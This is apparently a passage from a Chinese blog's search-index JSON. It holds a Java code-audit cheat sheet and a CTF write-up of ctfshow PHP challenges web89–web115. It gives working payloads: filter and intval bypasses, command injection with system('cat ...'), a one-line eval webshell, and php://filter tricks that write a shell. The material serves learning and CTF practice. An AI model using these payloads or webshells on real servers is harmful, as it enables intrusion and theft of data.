servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。\nJSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。\nJSP标签有多种功能，比如访问数据库、记录用户选择信息、访问JavaBeans组件等，还可以在不同的网页中传递控制信息和共享信息。\n\n5.java 代码审计xss前端反射型xss   (name参数可控) &lt;%String name = request.getParameter(&quot;name&quot;);out.println(name)%&gt;后端反射型 xss  (msg参数可控) public void Message(HttpServletRequest req, HttpServletResponse resp) &#123;\tString message = req.getParameter(&quot;msg&quot;);try&#123;\tresp.getWriter().print(message);&#125; catch (IOException e) &#123;\te. printStackTrace();&#125;DOM xss只发生在客户端处理数据阶段，未经过滤被传入存在缺陷的JavaScript代码处理。&lt;script&gt;    var pos = document.URL.indexOf(&quot;#&quot;)+1;    var name = document.URL.substring(pos, document.URL.length);    document.write(name);eval(&quot;var a = &quot; + name);&lt;/script&gt;储存型xss 会通过JDBC与数据库交互\n\n\n\n6.Java 常用的文件操作方法Files.readAllBytes、Files.readAllLinesFileInputStreamFileOutputStreamFileFileUtilsIOUtilsBufferedReaderServletFileUploadMultipartFileCommonsMultipartFilePrintWriterZipInputStreamZipEntry.getSize\n\n\n\n7.文件上传关键函数DiskFileItemFactory@MultipartConfigMultipartFileFileUploadInputStreamOutputStreamwritefileNamefilePath\n\n\n\n8.servlet文件上传函数\nservlet3之前使用commons-fileupload、commons-io这两个jar包来处理文件上传\nservlet3之后使用request.getParts()获取上传文件\n\n9.java任意文件上传private boolean uploadWithAnnotation(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException &#123;    Part part = request.getPart(&quot;fileName&quot;);    if(part == null) &#123;      return false;    &#125;    String filename = UPLOAD_PATH + File.separator + part.getSubmittedFileName();    part.write(filename);    part.delete();    return true;&#125;\n\n\n\n10.任意文件删除String filename = request.getParameter(&quot;filename&quot;);File file = new File(filename);if(file != null &amp;&amp; file.exists() &amp;&amp; file.delete()) &#123;  \tresponse.getWriter().println(&quot;delete success&quot;);&#125; else &#123;  \tresponse.getWriter().println(&quot;delete failed&quot;);&#125;","categories":["学习"]},{"title":"PHP特性","url":"/2022/03/21/PHP%E7%89%B9%E6%80%A7/","content":"PHP特性php特性这个东西很杂，覆盖的内容也很多，都是一些零碎的知识点，这次正好借这个刷题的机会，做一个小复习\nweb89include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num))&#123;        echo $flag;    &#125;&#125;\n\n这里preg_match(&quot;/[0-9]/&quot;, $num过滤了数字，但是\n我们要让intval($num)为真，这题考的就是intval的特性\nintval()的测试\n\n返回值成功时返回 var 的 integer 值，失败时返回 0。空的 array 返回 0，非空的 array返回 1。 \n\n测试了一下\n&lt;?phpecho intval(1234);  //1234echo &quot;\\n&quot;;echo intval(042);  //34  0开头的，当成了8进制echo &quot;\\n&quot;;echo intval(0x1a);  //26 0x开头，当成16进制echo &quot;\\n&quot;;echo intval(3e3);  //3000 科学计数法 3 X 10的三次方echo &quot;\\n&quot;;echo intval(&#x27;3e3&#x27;);  //3000echo &quot;\\n&quot;;echo intval(&quot;1234a&quot;);  //1234echo &quot;\\n&quot;;echo intval(4.2); //转化为整数\n\n回到题目\n可以用数组绕过\n?num[]=a\n\n\n\nweb90include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num===&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125; \n\n与上题类似，但这次没过滤数字\n这里又要说一下intval的相关特性\nintval ( mixed $var [, int $base = 10 ] )\n\n\n如果 base 是 0，通过检测 var 的格式来决定使用的进制：\n\n如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，\n如果字符串以 “0” 开始，使用 8 进制(octal)；否则，\n将使用 10 进制 (decimal)。\n\n\nintval(&#x27;4476a&#x27;,0)=4476intval(&#x27;010574&#x27;,0)=4476intval(&#x27;0x117c&#x27;,0)=4476\n\n上述三中均能绕过\nweb91show_source(__FILE__);include(&#x27;flag.php&#x27;);$a=$_GET[&#x27;cmd&#x27;];if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;        echo &#x27;hacker&#x27;;    &#125;    else&#123;        echo $flag;    &#125;&#125;else&#123;    echo &#x27;nonononono&#x27;;&#125; \n\n我们先来看看 正则匹配修饰符\ni 不区分(ignore)大小写；g 全局(global)匹配m 多(more)行匹配s 特殊字符圆点 . 中包含换行符U 只匹配最近的一个字符串;不重复匹配; //修正符:x 将模式中的空白忽略; //修正符:A 强制从目标字符串开头匹配;//修正符:D 如果使用$限制结尾字符,则不允许结尾有换行; //修正符:e 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行;  \n\n(preg_match(&#39;/^php$/im&#39;, $a))这个匹配以php开头的字符串并且多行匹配\n(preg_match(&#39;/^php$/i&#39;, $a))这个也是匹配以php开头的字符串，但不支持多行匹配，只能匹配一行\n\npreg_match() 在第一次匹配后 将会停止搜索。preg_match_all() 不同于此，它会一直搜索subject 直到到达结尾\n\n%0a换行，相当于enter\npayload\n?cmd=%0aphp或?cmd=php%0a1   (但php%0a不行)\n\n这里我有个小小的疑惑点，针对第一个 %0aphp显然这里是匹配的第一行，第二个payload php%0a1，显然这里匹配的是第二行，所以具体的匹配机制有点没懂\n请假了一下群里的师傅这里主要跟^php$这个有关，(preg_match(&#39;/^php$/i&#39;, $a))这个以一整行为一个整体进行判断，经过测试这个只匹配第一行\nweb92include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)==4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;\n\n\n\n\nintval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法\n\n所以我们可以用e绕过也可以用二进制（0b），十六进制（0x）绕过\npayload\n?num=0b1000101111100?num=0x117c?num=4476e123\n\n\n\nweb93include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)==4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125; \n\n比上一题多过滤了一个字母，这样我们e和二进制，十六进制都用不了，\n八进制是以数字0开头的，刚好可以绕过\n?num=010574\n\n\n\nweb94include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num===&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;&#125;\n\n这一题相对于上一题，不让数字0出现在第一位,而且第一个if是===强比较\n我们可以用小数 4476.0绕过 或者\n?num=4476.0\n\n可以在前面加上一个加号，当空格\n?num=+010574?num= 010574//空格也可以\n\n\n\nweb95include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123;        die(&quot;no no no!!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!!!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;&#125;\n\n这里第一个判断又换成弱比较了，只能用 空格和 + 绕过\n?num= 010574?num=+010574\n\n\n\nweb96highlight_file(__FILE__);if(isset($_GET[&#x27;u&#x27;]))&#123;    if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;        die(&quot;no no no&quot;);    &#125;else&#123;        highlight_file($_GET[&#x27;u&#x27;]);    &#125;&#125; \n\n这题没什么过滤直接读当前目录下的flag.php就好\n?u=./flag.php\n\n或者用伪协议读取也行\n?u=php://filter/resource=flag.php\n\n\n\nweb97include(&quot;flag.php&quot;);highlight_file(__FILE__);if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))echo $flag;elseprint &#x27;Wrong.&#x27;;&#125;?&gt; \n\n题目需要我们用post方式传入a和b，并且a!&#x3D;b（这里是弱比较）\n但这里md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])这里我们可以利用一个字符串比较的一个特性\n\nMD5这个函数呢有个漏洞，传入的参数为数组的时候会发生错误，并返回NULL\n\na[]=1&amp;b[]=2\n\n\n\nweb98include(&quot;flag.php&quot;);$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);?&gt; \n\n`$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;` \n\n这句话解释一下，这是三目运算符\n当存在GET传参时，则把post传参地址给get，如果不存在则传的参数为flag\n$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;\n\n如果传的flag&#x3D;’flag’,则把COOKIE传参地址给get,否则让其等于’flag’\n$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;; \n\n如果传的flag&#x3D;’flag’,则把SERVER传参地址给get,否则让其等于’flag’\n$_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__\n\n如果传入的HTTP_FLAG&#x3D;‘flag’显示$flag，否则显示当前页面\n如果我们直接用get方式传入\n?HTTP_FLAG=flag\n\n由于存在GET传参，会把post传参地址给get\n所以这里我们随便用get方式传入一个，然后用post覆盖掉\n?num=1111post:HTTP_FLAG=flag\n\n即可highlight_file($flag)，因为$flag不是php文件，所以会导致报错而回显$flag的值\nweb99highlight_file(__FILE__);$allow = array();for ($i=36; $i &lt; 0x36d; $i++) &#123;     array_push($allow, rand(1,$i));&#125;if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);&#125;?&gt; \n\narray_push\n\narray_push — 将一个或多个单元压入数组的末尾（入栈）\n\nin_array\n\n检查数组中是否存在某个值，如果没有设置第三个参数，则使用宽松的比较，先将字符串转化为i数字，再比较\n\n分析一下题目首先将许多随机数放入数组中，然后当传入的n在数组中，将content写入传入的n中\n由于这里循环了很多次，出现1的概率比较大（多试几次总能成功）\n然后是 1.php在进行判断时 1.php == 1\n并将一句话木马写入content\n?n=1.phpPOST:content=&lt;?php @eval($_POST[1]);?&gt;\n\n蚁剑连接即可\nweb100highlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;/\\;/&quot;, $v2))&#123;        if(preg_match(&quot;/\\;/&quot;, $v3))&#123;            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);        &#125;    &#125;    &#125; \n\nis_numeric\n\n— 检测变量是否为数字或数字字符串\n\n这个题第一次做的时候时非常懵逼的\n这题的解题点在\n$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);\n\n这里就要讲一下运算符的优先级问题了\n&amp;&amp; --&gt; || --&gt; = --&gt; and --&gt; or\n\n所以题目这里赋值的优先级大于and，即\n$v0=is_numeric($v1)\n\n所以这里我们只需要让v1为数字，后面两个参数可控，v2,v3过滤了分号，\n现在就要解决\neval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);\n\n突然发现题目注释里有  flag in class ctfshow; \n我这里直接用管道符了||\n?v1=1&amp;v2=system(&quot;cat ctfshow.php&quot;)||&amp;v3=;\n\n\n\nweb101highlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|[0-9]/&quot;, $v2))&#123;        if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\?|[0-9]/&quot;, $v3))&#123;            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);        &#125;    &#125;    &#125; \n\n这个题相比上个，增加了许多过滤\n主要还是构造\neval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;); \n\n这里也是看了很多师傅的wp才理解，需要讲一下\nReflectionClasss\n\n反射类ReflectionClass执行命令\nReflectionClass反射类在PHP5新加入，继承自Reflector，它可以与已定义的类建立映射关系，通过反射类可以对类操作反射类不仅仅可以建立对类的映射，也可以建立对PHP基本方法的映射，并且返回基本方法执行的情况。因此可以通过建立反射类new ReflectionClass(system(‘cmd’))来执行命令\n\npayload\n?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;\n\n最后将 0x2d改为 -  ，发现只有35位，没想到最后一位要爆破。。。看运气咯\nweb102highlight_file(__FILE__);$v1 = $_POST[&#x27;v1&#x27;];$v2 = $_GET[&#x27;v2&#x27;];$v3 = $_GET[&#x27;v3&#x27;];$v4 = is_numeric($v2) and is_numeric($v3);if($v4)&#123;    $s = substr($v2,2);    $str = call_user_func($v1,$s);    echo $str;    file_put_contents($v3,$str);&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;?&gt;\n\nsubstr\n\nsubstr ( string $string , int $start [, int $length ] ) : string\n返回字符串 string 由 start 和 length 参数指定的子字符串。\n\n这里 $s = substr($v2,2);截取了v2的[2:],从第三个字符到末尾\ncall_user_func\n\ncall_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) : mixed\n第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。\n\n这里v1，v3可控，v2要保证能写shell，又要保证能为数字。\n这里百思不得其解，看了师傅的wp后，真的要感叹一下，师傅们的创造力啊！\n&lt;?=`tac *`;  \n\n这是我们要执行的命令，进行hex编码后为：3c3f3d60746163202a603b ，发现其中有字母于是在此之前进行base64编码一次\nPD89YHRhYyAqYDs= //在进行hex编码\n\n5044383959485268597941715944733d\n\n这时我们发现 3d为等号\n即v1&#x3D;hex2bin  v2&#x3D;00504438395948526859794171594473  v3&#x3D;php:&#x2F;&#x2F;1.php\npayload\nPOST:v1=hex2bin?v2=00504438395948526859794171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php\n\n太妙了！！\nweb103highlight_file(__FILE__);$v1 = $_POST[&#x27;v1&#x27;];$v2 = $_GET[&#x27;v2&#x27;];$v3 = $_GET[&#x27;v3&#x27;];$v4 = is_numeric($v2) and is_numeric($v3);if($v4)&#123;    $s = substr($v2,2);    $str = call_user_func($v1,$s);    echo $str;    if(!preg_match(&quot;/.*p.*h.*p.*/i&quot;,$str))&#123;        file_put_contents($v3,$str);    &#125;    else&#123;        die(&#x27;Sorry&#x27;);    &#125;&#125;else&#123;    die(&#x27;hacker&#x27;);&#125; \n\n过滤的更加多了，用上一题的思路也能解出来，我换一个吧\n&lt;?=`cat *`;\n\n转化为base64\nPD89YGNhdCAqYDs\n\n再转化为ascii的十六进制\n5044383959474e6864434171594473\n\n我们发现这个很巧妙的里面只有一个字母e，但这里可以将其当成科学计数法，\npayload\n?v2=005044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php\n\n\n\nweb104highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;    $v1 = $_POST[&#x27;v1&#x27;];    $v2 = $_GET[&#x27;v2&#x27;];    if(sha1($v1)==sha1($v2))&#123;        echo $flag;    &#125;&#125; \n\n数组绕过，sha(a[])会返回null  而null&#x3D;&#x3D;null\nweb105highlight_file(__FILE__);include(&#x27;flag.php&#x27;);error_reporting(0);$error=&#x27;你还想要flag嘛？&#x27;;$suces=&#x27;既然你想要那给你吧！&#x27;;foreach($_GET as $key =&gt; $value)&#123;    if($key===&#x27;error&#x27;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key=$$value;&#125;foreach($_POST as $key =&gt; $value)&#123;    if($value===&#x27;flag&#x27;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key=$$value;&#125;if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;    die($error);&#125;echo &quot;your are good&quot;.$flag.&quot;\\n&quot;;die($suces); \n\n这题其实第一做的时候挺懵逼的，后来仔细理清了一下思路，其实就是简单的变量覆盖\nforeach($_GET as $key =&gt; $value)&#123;    if($key===&#x27;error&#x27;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key=$$value; \n\n这里将我们用GET方式传入的参数当成KEY，参数的值作为VALUE\n最后这里 $$key=$$value; 这里key不能等于error，于是\n我们传入 suces=flag\n这样 $suces=$flag这里我们成功将flag的值传给了suces，接下来我们再将seces的值传给error\n同理，我们用post方式传入 error=suces\n$errot=$suces=$flag\n\n最后由于不成立\nif(!($_POST[&#x27;flag&#x27;]==$flag))&#123;    die($error); \n\n将error打印出来，此时error的值就是flag\npayload\n?suces=flagPOST:error=suces\n\n\n\nweb106include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;    $v1 = $_POST[&#x27;v1&#x27;];    $v2 = $_GET[&#x27;v2&#x27;];    if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;        echo $flag;    &#125;&#125; \n\n数组绕过，这里不重复讲了。。\nweb107include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]))&#123;    $v1 = $_POST[&#x27;v1&#x27;];    $v3 = $_GET[&#x27;v3&#x27;];       parse_str($v1,$v2);       if($v2[&#x27;flag&#x27;]==md5($v3))&#123;           echo $flag;       &#125;&#125; \n\nparse_str\n\nparse_str ( string $encoded_string [, array &amp;$result ] ) : void\n如果 encoded_string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。\n\n这里我们传入v3&#x3D;flag\nv1=flag=327a6c4304ad5938eaf0efb6cc3e53dc（其实就是flag经过md5后的值）\npayload\n?v3=flagPOST:v1=flag=327a6c4304ad5938eaf0efb6cc3e53dc\n\n另一种思路 md5一个数组的值为null，如果v2这个数组中的flag值也为null，null&#x3D;&#x3D;null\n?v3[]=POST:V1=\n\n\n\nweb108highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE)  &#123;    die(&#x27;error&#x27;);&#125;//只有36d的人才能看到flagif(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;    echo $flag;&#125;\n\n其实这个题就考了一个知识点\nereg函数可以用%00截断\npayload\n?c=a%00778\n\n\n\nweb109highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;    $v1 = $_GET[&#x27;v1&#x27;];    $v2 = $_GET[&#x27;v2&#x27;];    if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;            eval(&quot;echo new $v1($v2());&quot;);    &#125;&#125; \n\n正则匹配要求v1和v2要包含字母。题目中eval里的语句，和之前web101有点相似。初始化$v1，v1是个类，$v2()是参数。\n这道题用到了魔术方法__toString()，不少php的内置类里都包含有这个方法，如Reflectionclass、Exception、Error__toString()：当一个对象被当作字符串对待的时候，会触发这个魔术方法，格式化输出这个对象所包含的数据。\n\nPHP5.2.0之前，__toString() 方法只在使用 echo 或 print 时才生效。PHP5.2.0之后，可以在任何字符串环境生效\n\n所以echo使得$v1类触发__toString()，传递的参数v2会被输出。\npayload\n?v1=CachingIterator&amp;v2=system(ls)?v1=Exception&amp;v2=system(&#x27;cat fl36dg.txt&#x27;) \n\n\n\nweb110if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;    $v1 = $_GET[&#x27;v1&#x27;];    $v2 = $_GET[&#x27;v2&#x27;];    if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;    if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;    eval(&quot;echo new $v1($v2());&quot;);&#125; \n\n以使用FilesystemIterator文件系统迭代器来进行利用，通过新建FilesystemIterator，使用getcwd()来显示当前目录下的文件结构\npayload\n?v1=FilesystemIterator&amp;v2=getcwd\n\n回显fl36dga.txt\n访问url&#x2F;fl36dga.txt得到flag\n其实这里的FilesystemIterator没咋弄懂，还需要找师傅请教一下\n后续\n稍微懂了一点\n\n通过新建FilesystemIterator，可以显示当前目录下的文件结构。由于参数内部有个括号，所以不能使用字符串来索引路径，而是要通过拼接方法getcwd()来获取当前的路径\n\n&lt;?php\terror_reporting(0);\techo getcwd().PHP_EOL;\techo new FilesystemIterator(&#x27;./&#x27;).PHP_EOL;\techo new FilesystemIterator(getcwd());?&gt;输出为D:\\PHP  index.php  index.php\n\n\n\nweb111highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);function getFlag(&amp;$v1,&amp;$v2)&#123;    eval(&quot;$$v1 = &amp;$$v2;&quot;);    var_dump($$v1);&#125;if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;    $v1 = $_GET[&#x27;v1&#x27;];    $v2 = $_GET[&#x27;v2&#x27;];    if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;    if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;        if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;            getFlag($v1,$v2);    &#125;     \n\n当v1传入ctfshow，执行getFlag函数\neval(&quot;$$v1 = &amp;$$v2;&quot;);    var_dump($$v1);\n\n也就是$ctfshow&#x3D;$$v2,然后将$$v1打印出来\n我们另v2=GLOBALS\nvar_dump($GLOBALS);\n\npayload\n?v1=ctfshow&amp;v2=GLOBALS\n\n\n\nweb112highlight_file(__FILE__);error_reporting(0);function filter($file)&#123;    if(preg_match(&#x27;/\\.\\.\\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;        die(&quot;hacker!&quot;);    &#125;else&#123;        return $file;    &#125;&#125;$file=$_GET[&#x27;file&#x27;];if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;&#125;\n\nis_file\n\n判断给定文件名是否为一个正常的文件。\n\nis_file用php伪协议即可绕过\npayload\n?file=php://filter/resource=flag.php\n\n\n\nweb113highlight_file(__FILE__);error_reporting(0);function filter($file)&#123;    if(preg_match(&#x27;/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;        die(&#x27;hacker!&#x27;);    &#125;else&#123;        return $file;    &#125;&#125;$file=$_GET[&#x27;file&#x27;];if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;\n\n这题过滤掉了filter，这个协议就用不了，这里增加一点知识点\nlinux里/proc/self/root是指向根目录的\n也就是如果在命令行中输入ls /proc/self/root，其实显示的内容是根目录下的内容\n这里我们多次重复即可绕过is_file\npayload\n?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\n\n另一种解法\ncompress.zlib://flag.php\n\n应该是把flag.php当成压缩文件来读取，具体的不知道。\nweb114error_reporting(0);highlight_file(__FILE__);function filter($file)&#123;    if(preg_match(&#x27;/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;        die(&#x27;hacker!&#x27;);    &#125;else&#123;        return $file;    &#125;&#125;$file=$_GET[&#x27;file&#x27;];echo &quot;师傅们居然tql都是非预期 哼！&quot;;if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;&#125;\n\ncompress和root被ban掉了，\n山重水复疑无路，柳暗花明又一村\nfilter没有ban\npayload\n?file=php://filter/resource=flag.php\n\n\n\nweb115include(&#x27;flag.php&#x27;);highlight_file(__FILE__);error_reporting(0);function filter($num)&#123;    $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);    $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);    $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);    $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);    $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);    return $num;&#125;$num=$_GET[&#x27;num&#x27;];if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;    if($num==&#x27;36&#x27;)&#123;        echo $flag;    &#125;else&#123;        echo &quot;hacker!!&quot;;    &#125;&#125;else&#123;    echo &quot;hacker!!!&quot;; \n\ntrim\n\n 去除字符串首尾处的空白字符（或者其他字符）\n 果不指定第二个参数，trim() 将去除这些字符\n\n“ “ (ASCII 32 (0x20))，普通空格符。\n“\\t” (ASCII 9 (0x09))，制表符。\n“\\n” (ASCII 10 (0x0A))，换行符。\n“\\r” (ASCII 13 (0x0D))，回车符。\n“\\0” (ASCII 0 (0x00))，空字节符。\n“\\x0B” (ASCII 11 (0x0B))，垂直制表符。\n\n\n这里我们写了个脚本\n &lt;?phpfor($i=1;$i&lt;=128;$i++)&#123;    $a=chr($i).&#x27;1&#x27;;    if(trim($a)!==&#x27;1&#x27;&amp;&amp;is_numeric($a))&#123;        echo urlencode(chr($i));        echo &quot;\\n&quot;;    &#125;    &#125;\n\n最后跑出来的结果是 %0c(换页符)\npayload\n?num=%0c36\n\n\n\nweb123error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;    